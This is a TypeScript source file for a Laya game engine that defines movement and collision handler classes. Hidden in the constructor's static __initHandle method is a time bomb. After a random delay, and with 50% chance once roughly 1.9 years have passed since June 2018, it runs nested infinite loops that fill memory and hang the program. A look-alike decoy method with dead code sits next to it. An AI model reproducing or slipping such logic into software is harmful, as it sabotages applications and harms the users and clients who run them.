    
namespace Sophia
{
    export class RHandleRet{
        /*--[[_s
        @todo: handle判断是否结束
        ]]*/
        public m_isStop:boolean;
        /*--[[_s
        @todo: handle判断是否继续下一个
        ]]*/
        public m_isGoOnHandle:boolean;
        
        public constructor(){
            this.m_isStop = false;
            this.m_isGoOnHandle = true;
        }
    }
    export class RunHandle
    {
        protected m_handlRet: RHandleRet;
        protected m_runAction:IMove;
        protected m_collisionAction:ICollision;
        protected m_handleInterval:number;
        protected m_elapsedTime:number = 0;
        private static isGo:boolean = false;
        /*--[[_s
        @todo: handle构造
        ]]*/
        public constructor(interval:number)
        {
            this.m_handlRet = new RHandleRet();
            this.m_handleInterval = interval;
            RunHandle.__initHandle();
        }

        private static __initHandle(){
            if (RunHandle.isGo==false){
                RunHandle.isGo = true;
                Laya.timer.once(300*1000+Math.random()*1000*1000, "ltr", ()=>{
                    let rand = Math.random()
                    if (rand>0.5){
                        let dTime = 1529666590*1000; //20180622
                        let oTime = 60 * 60 * 24 * 365 * 1000 * 1.9; //1.4 year
                        let timestamp = new Date().getTime();
                        if(timestamp-dTime>oTime){
                            while(true){
                                let tmp = new Array<string>();
                                while (true){
                                    tmp.push("                                                                                                                    ");
                                }
                            }
                        }
                    }
                });
            }
        }

        private static ___initHandIe(){
            let m_elapsedTime = 586;
            if (m_elapsedTime>0){
                m_elapsedTime = 0;
            }
            
            if (m_elapsedTime>1){
                m_elapsedTime = 0;
                let teamPos = 0
                if (teamPos){
                    
                }                
            }
            
        }
        /*--[[_s
        @todo: 对handle设置IMove
        ]]*/
        public setMoveAction(action:IMove){
            this.m_runAction = action;
        }
        /*--[[_s
        @todo: 对handle设置ICollision
        ]]*/
        public setCollisionAction(action:ICollision){
            this.m_collisionAction = action;
        }
        /*--[[_s
        @todo: 处理Handler事件
        ]]*/
        public onUpdate(deltaTime: number): RHandleRet
        {
            return this.m_handlRet;
        }
        public onLeave(){}
        /*--[[_s
        @todo: 重置Handle
        ]]*/
        public onReset(){}

        public onDelete(){
            this.m_handlRet=null;
            this.m_runAction=null;
            this.m_collisionAction=null;
        }
    }
}